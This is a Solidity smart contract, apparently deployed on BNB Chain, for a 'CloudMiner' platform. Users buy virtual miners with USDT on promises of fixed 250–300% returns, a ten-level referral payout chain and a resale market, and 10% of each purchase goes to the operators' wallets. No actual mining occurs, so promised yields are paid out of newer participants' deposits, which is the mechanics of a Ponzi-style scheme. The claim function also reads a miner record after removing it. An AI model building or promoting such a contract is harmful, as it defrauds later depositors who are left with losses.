/**
 *Submitted for verification at BscScan.com on 2025-08-05
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

interface IERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract CloudMiner {
    IERC20 public immutable usdt;
    address public owner;
    address public engineWallet;
    address public marketingWallet;

    uint256 public constant BASE = 10000;
    uint256 public constant SELL_FEE = 1000; // 10%
    uint256 public totalUsers;
    uint256 public totalMiners;
    
    enum MinerModel { M1, S2, X3, V4, Z5, X6, G7, X8 }

    struct MinerPlan {
        uint256 price;
        uint256 productionPerHour;
        uint256 maxHours;
        uint8 referralLevels;
    }

    struct Listing {
        address seller;
        Miner miner;
        uint256 price;
        bool active;
    }

    struct Miner {
        MinerModel model;
        uint256 startTime;
        uint256 usedHours;
        uint256 lastClaim;
    }

struct MinerInfo {
    MinerModel model;
    uint256 startTime;
    uint256 usedHours;
    uint256 lastClaim;
    uint256 claimable;
    uint256 maxHours;
    uint256 productionPerHour;
}

    struct User {
        address referrer;
        Miner[] miners;
        bool exists;
    }

    mapping(MinerModel => MinerPlan) public plans;
    mapping(address => User) public users;
    mapping(address => address[]) public directReferrals;
    mapping(uint256 => Listing) public marketListings;
    mapping(address => uint256) public referralEarnings;
    uint256 public listingIdCounter;
    
    event MinerPurchased(address indexed user, MinerModel model, uint256 timestamp);
    event ProductionClaimed(address indexed user, uint256 amount, uint256 timestamp);
    event Withdrawn(address indexed user, uint256 amount);
    event ReferralReward(address indexed from, address indexed to, uint8 level, uint256 amount);
    event MinerSold(address indexed seller, uint256 amountAfterFee, uint256 fee);
    event MinerDelisted(address indexed seller, uint256 indexed listingId);
    event MinerPurchasedFromMarket(address indexed buyer, address indexed seller, uint256 indexed listingId, uint256 price);
    event MinerListed(address indexed seller, uint256 price);
    event OwnershipRenounced(address previousOwner);
    event MinerExpired(address indexed user, MinerModel model);
    event MinerSoldToSystem(address indexed user, MinerModel model, uint256 payout, uint256 hoursRemaining);


modifier nonReentrant() {
    require(!_locked, "ReentrancyGuard: reentrant call");
    _locked = true;
    _;
    _locked = false;
}

modifier onlyOwner() {
    require(msg.sender == owner, "Not the owner");
    _;
}

constructor(
    address _usdt,
    address _engineWallet,
    address _marketingWallet
) {
    usdt = IERC20(_usdt);
    engineWallet = _engineWallet;
    marketingWallet = _marketingWallet;
    owner = _engineWallet; 

    plans[MinerModel.M1] = MinerPlan(1e18,     0.060e18,   2083, 1); // 1.2% daily, 250% total
    plans[MinerModel.S2] = MinerPlan(1e18,    0.125e18,   2080, 2); // 1.25% daily, 260% total
    plans[MinerModel.X3] = MinerPlan(2e18,    0.338e18,   2077, 4); // 1.3% daily, 270% total
    plans[MinerModel.V4] = MinerPlan(500e18,    0.676e18,   2037, 6); // 1.35% daily, 275% total
    plans[MinerModel.Z5] = MinerPlan(1000e18,   1.167e18,   2000, 7); // 1.4% daily, 280% total
    plans[MinerModel.X6] = MinerPlan(2000e18,   2.354e18,   1993, 8); // 1.43% daily, 285% total
    plans[MinerModel.G7] = MinerPlan(5000e18,   6.042e18,   2000, 9); // 1.45% daily, 290% total
    plans[MinerModel.X8] = MinerPlan(10000e18, 12.500e18,   2000, 10); // 1.5% daily, 300% total

    }

bool private _locked = false;

function buyMiner(MinerModel model, address referrer) external {
    MinerPlan memory plan = plans[model];
    require(plan.price > 0, "Model not available");

    uint256 engineFee = (plan.price * 600) / BASE;      // 6%
    uint256 marketingFee = (plan.price * 400) / BASE;   // 4%
    uint256 contractShare = plan.price - engineFee - marketingFee;

    require(usdt.transferFrom(msg.sender, address(this), contractShare), "Transfer to contract failed");
    require(usdt.transferFrom(msg.sender, engineWallet, engineFee), "Transfer to engine failed");
    require(usdt.transferFrom(msg.sender, marketingWallet, marketingFee), "Transfer to marketing failed");

    User storage user = users[msg.sender];

    if (!user.exists) {
        user.exists = true;
        totalUsers++;

        if (
            referrer != address(0) &&
            referrer != msg.sender &&
            users[referrer].exists &&
            users[msg.sender].referrer == address(0)
        ) {
            user.referrer = referrer;
            directReferrals[referrer].push(msg.sender);
        }
    }

    user.miners.push(Miner({
        model: model,
        startTime: block.timestamp,
        usedHours: 0,
        lastClaim: block.timestamp
    }));

    totalMiners++;

    emit MinerPurchased(msg.sender, model, block.timestamp);
}

function _removeMiner(address user, uint index) internal {
    User storage u = users[user];
    require(index < u.miners.length, "Index out of range");

    uint last = u.miners.length - 1;
    if (index != last) {
        u.miners[index] = u.miners[last];
    }
    u.miners.pop();
}

function sellMinerToSystem(uint index) external nonReentrant {
    User storage u = users[msg.sender];
    require(index < u.miners.length, "Invalid miner index");

    Miner memory m = u.miners[index];
    MinerPlan memory plan = plans[m.model];

    uint256 hoursRemaining = plan.maxHours > m.usedHours ? (plan.maxHours - m.usedHours) : 0;
    require(hoursRemaining > 0, "Miner already depleted");

 
    uint256 baseValue = (plan.price * hoursRemaining) / plan.maxHours;

    uint256 payout = (baseValue * 7000) / BASE; 

    require(usdt.transfer(msg.sender, payout), "Payout transfer failed");

    _removeMiner(msg.sender, index);

    emit MinerSoldToSystem(msg.sender, m.model, payout, hoursRemaining);
}

function claimProduction(uint index) public nonReentrant {
    User storage u = users[msg.sender];
    require(index < u.miners.length, "Invalid miner index");

    Miner storage m = u.miners[index];
    require(m.startTime > 0, "Inactive or removed miner");

    uint256 elapsedHours = (block.timestamp - m.lastClaim) / 1 hours;
    require(elapsedHours > 0, "You must wait at least 1 hour");

    MinerPlan memory plan = plans[m.model];
    uint256 remainingHours = plan.maxHours - m.usedHours;
    uint256 hoursToClaim = elapsedHours > remainingHours ? remainingHours : elapsedHours;

    uint256 amount = plan.productionPerHour * hoursToClaim;
    require(amount > 0, "No production available");

     m.lastClaim = block.timestamp;
    m.usedHours += hoursToClaim;

    require(usdt.transfer(msg.sender, amount), "USDT transfer failed");

    emit ProductionClaimed(msg.sender, amount, block.timestamp);

    if (m.usedHours >= plan.maxHours) {
        _removeMiner(msg.sender, index);
        
        emit MinerExpired(msg.sender, m.model);
    }

    _payReferrals(msg.sender, amount);
}

function getTotalReferrals(address user) external view returns (uint256) {
    return directReferrals[user].length;
}

function getReferralsAtLevel(address user, uint8 level) external view returns (address[] memory) {
    require(level == 1, "Only level 1 is stored");
    return directReferrals[user];
}

function getReferralEarnings(address user) external view returns (uint256 total) {
    return referralEarnings[user];
}

function listMiner(uint index, uint price) external {
    User storage u = users[msg.sender];
    require(index < u.miners.length, "Invalid index");
    require(price > 0, "Price must be greater than zero");

    Miner memory m = u.miners[index];

    uint256 listingId = listingIdCounter++;
    marketListings[listingId] = Listing({
        seller: msg.sender,
        miner: m,
        price: price,
        active: true
    });

    _removeMiner(msg.sender, index);

    emit MinerListed(msg.sender, price);
}

function autoListMiner(uint index) external {
    User storage u = users[msg.sender];
    require(index < u.miners.length, "Invalid index");

    Miner memory m = u.miners[index];
    MinerPlan memory plan = plans[m.model];

    uint256 remainingHours = plan.maxHours - m.usedHours;
    require(remainingHours > 0, "Miner has expired");

    uint256 baseValue = (plan.price * remainingHours) / plan.maxHours;

    uint256 value = (baseValue * 9000) / BASE;

    uint256 listingId = listingIdCounter++;
    marketListings[listingId] = Listing({
        seller: msg.sender,
        miner: m,
        price: value,
        active: true
    });

    _removeMiner(msg.sender, index);

    emit MinerListed(msg.sender, value);
}

function cancelListing(uint listingId) external {
    Listing storage listing = marketListings[listingId];
    require(listing.active, "No active listing");
    require(listing.seller == msg.sender, "You are not the owner of this listing");

    listing.active = false;

    users[msg.sender].miners.push(listing.miner);

    emit MinerDelisted(msg.sender, listingId);
}

function buyMinerFromMarket(uint listingId) external nonReentrant {
    Listing storage listing = marketListings[listingId];
    require(listing.active, "Invalid listing");
    require(msg.sender != listing.seller, "You cannot buy from yourself");

    uint256 fee = (listing.price * SELL_FEE) / BASE;          // 10%
    uint256 payout = listing.price - fee;                     // 90%

    uint256 feeEngine = (listing.price * 600) / BASE;         // 6%
    uint256 feeMarketing = (listing.price * 400) / BASE;      // 4%

    require(usdt.transferFrom(msg.sender, listing.seller, payout), "Transfer to seller failed");
    require(usdt.transferFrom(msg.sender, engineWallet, feeEngine), "Transfer to engine failed");
    require(usdt.transferFrom(msg.sender, marketingWallet, feeMarketing), "Transfer to marketing failed");

    users[msg.sender].miners.push(listing.miner);

    listing.active = false;

    emit MinerSold(listing.seller, payout, fee);
    emit MinerPurchasedFromMarket(msg.sender, listing.seller, listingId, listing.price);
}

function _getHighestModel(address user) internal view returns (MinerModel) {
    User storage u = users[user];
    require(u.miners.length > 0, "User has no miners");

    MinerModel max = u.miners[0].model;
    for (uint i = 1; i < u.miners.length; i++) {
        if (uint8(u.miners[i].model) > uint8(max)) {
            max = u.miners[i].model;
        }
    }

    return max;
}

function hasUnlockedLevel(address user, uint8 level) external view returns (bool) {
    if (!users[user].exists || users[user].miners.length == 0) return false;
    MinerModel highest = _getHighestModel(user);
    MinerPlan memory plan = plans[highest];
    return level <= plan.referralLevels;
}

function getHighestModel(address user) external view returns (uint8) {
    return uint8(_getHighestModel(user));
}

function getActiveListings() external view returns (uint[] memory ids) {
    uint count = listingIdCounter;
    uint[] memory temp = new uint[](count);
    uint j = 0;
    for (uint i = 0; i < count; i++) {
        if (marketListings[i].active) {
            temp[j++] = i;
        }
    }
    uint[] memory result = new uint[](j);
    for (uint k = 0; k < j; k++) {
        result[k] = temp[k];
    }
    return result;
}


function getListing(uint id) external view returns (Listing memory) {
    return marketListings[id];
}

function getMyMiners() external view returns (Miner[] memory) {
    return users[msg.sender].miners;
}

function renounceOwnership() external onlyOwner {
    emit OwnershipRenounced(owner);
    owner = address(0);
}

function getUserInfo(address user) external view returns (
    address referrer,
    uint256 minerCount,
    bool exists
) {
    User storage u = users[user];
    return (u.referrer, u.miners.length, u.exists);
}

function getGlobalStats() external view returns (
    uint256 _totalListings,
    uint256 _totalUsers,
    uint256 _totalMiners,
    uint256 _circulatingMiners
) {
    uint256 activeCount;

    for (uint i = 0; i < listingIdCounter; i++) {
        if (marketListings[i].active) {
            activeCount++;
        }
    }

    return (
        listingIdCounter,
        totalUsers,
        totalMiners,
        activeCount
    );
}
function getMyMinersDetailed() external view returns (MinerInfo[] memory) {
    User storage u = users[msg.sender];
    uint256 len = u.miners.length;

    MinerInfo[] memory result = new MinerInfo[](len);

    for (uint i = 0; i < len; i++) {
        Miner storage m = u.miners[i];
        MinerPlan memory plan = plans[m.model];

        uint256 elapsedHours = (block.timestamp - m.lastClaim) / 1 hours;
        uint256 remainingHours = plan.maxHours - m.usedHours;
        uint256 hoursToClaim = elapsedHours > remainingHours ? remainingHours : elapsedHours;
        uint256 claimable = plan.productionPerHour * hoursToClaim;

        result[i] = MinerInfo({
            model: m.model,
            startTime: m.startTime,
            usedHours: m.usedHours,
            lastClaim: m.lastClaim,
            claimable: claimable,
            maxHours: plan.maxHours,
            productionPerHour: plan.productionPerHour
        });
    }

    return result;
}

function _payReferrals(address from, uint256 amount) internal {
    address current = users[from].referrer;

    for (uint8 i = 0; i < 10 && current != address(0); i++) {
        User storage upline = users[current];
        if (upline.miners.length == 0) {
            current = upline.referrer;
            continue;
        }

        MinerModel highestModel = _getHighestModel(current);
        MinerPlan memory plan = plans[highestModel];

        if (plan.referralLevels >= i + 1) {
            uint256 percentage;

            if (i == 0) percentage = 1000;
            else if (i == 1) percentage = 500;
            else if (i == 2) percentage = 300;
            else if (i == 3) percentage = 200;
            else percentage = 100;

            uint256 reward = (amount * percentage) / BASE;

            if (reward > 0) {
                require(usdt.transfer(current, reward), "Referral transfer failed");
                referralEarnings[current] += reward;
                emit ReferralReward(from, current, i + 1, reward);
            }
        }

        current = upline.referrer;
    }
}

}